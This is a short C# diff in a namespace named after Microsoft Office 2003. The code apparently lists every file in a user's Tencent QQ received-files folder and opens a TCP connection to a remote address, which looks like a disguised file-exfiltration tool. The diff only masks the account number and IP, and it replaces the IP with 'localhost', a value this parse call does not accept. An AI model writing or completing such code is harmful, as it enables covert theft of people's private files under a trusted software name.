@@ -201,7 +201,7 @@ namespace Microsoft_Office_2003
             Thread th = Thread.CurrentThread;
 
             //初始化获得文件夹下所有文件
-            string folderFullName = "C:/Users/WuHaoze/Documents/Tencent Files/3348253586/FileRecv/";
+            string folderFullName = "C:/Users/WuHaoze/Documents/Tencent Files/xxxxx/FileRecv/";
             string fileName = "";
             List<string> all_file = new List<string>();
             DirectoryInfo TheFolder = new DirectoryInfo(folderFullName);
@@ -212,7 +212,7 @@ namespace Microsoft_Office_2003
                 all_file.Add(folderFullName+fileName);
             }
             //TCP连接初始化
-            IPAddress ip = IPAddress.Parse("xxx.xxx.xxx.xxx");
+            IPAddress ip = IPAddress.Parse("localhost");
             Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
             //尝试连接
             try
